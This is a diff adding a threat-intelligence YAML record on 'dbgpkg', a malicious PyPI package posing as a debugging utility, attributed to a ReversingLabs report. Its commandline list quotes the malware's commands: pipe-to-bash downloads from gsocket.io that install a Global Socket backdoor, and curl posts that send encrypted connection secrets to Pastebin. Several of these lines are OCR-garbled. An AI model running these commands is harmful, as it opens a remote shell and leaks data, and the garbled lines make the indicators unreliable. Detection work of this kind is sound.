@@ -1,0 +1,55 @@
+description: A newly uploaded malicious Python package (dbgpkg) on PyPI poses as a
+  debugging utility but implants a backdoor, enabling attackers to execute code and
+  exfiltrate sensitive data. The campaign may be linked to a hacktivist gang supporting
+  Ukraine.
+attribution: Phoenix Hyena / DumpForums
+malware_families:
+- Global Socket Toolkit (GST)
+TTPs:
+  processes:
+  - curl
+  - bash
+  - openssl
+  - python
+  commandline:
+  - curl X POST -dapi_dev_key=35Ls -WsIdX2ZMINGVStGUNT35PNOhUXR"api_usen_key=2609ddegecascscadbofd3271330aceb
+    ~d "api_option=shou_paste-d "api_paste_key=gzTFVINH" https://pastebin.con/api/api_post.php
+    > /tmp/pub.pen, shell=True, capture_output=True
+  - curl -fsSik https://gsocket.io/y | bash |grep gs-netcat | openssl pkeyutl -encrypt
+    -pubin -inkey /tmp/pub.pem |openss] base64 > /tmp/out.txt, shell=True, capture_output=True
+  - curl X POST -dapi_dev_key=35Ls -WsIdX2ZMINGVStGUNT35PNOhUXR"api_usen_key=2609ddegecascscadbofd3271330aceb
+    ~d api_option=paste -d"api_paste_private=2" -d "api_paste_code=(cat /tmp/out.txt)"
+    "https://pastebin.con/api/api_post.phpTM*, shell=True, capture_output=True
+  - rm /tmp/out.txt /tmp/pub.pen, shell=True,capture_output=True
+  - bash -c "$(curl -fsSL gsocket.io/x)"
+  - wget -q0- gsocket.io/x
+  powershell: ''
+  scripting_engine: ''
+  registry_keys: ''
+  image_load: ''
+  network_connections:
+  - executable: curl
+    destination_address: pastebin.con
+    port: ''
+    url: https://pastebin.con/api/api_post.php
+  - executable: curl
+    destination_address: gsocket.io
+    port: ''
+    url: https://gsocket.io/y
+  file_modifications:
+  - /tmp/pub.pen
+  - /tmp/out.txt
+  persistence:
+  - Cronjob
+  - ~/.profile
+  pipes: ''
+  process_relations: ''
+IOCs:
+- dbgpkg 1.3.8
+- pip install dbgpkg
+- ZtrLSiJrCX8kmWShmYOMN
+authors:
+- Karlo Zanki, ReversingLabs
+reference: https://www.reversinglabs.com/blog/backdoor-implant-discovered-on-pypi-posing-as-debugging-utility
+date_of_publication: May 15, 2025
+file_creation_date: May 16, 2025
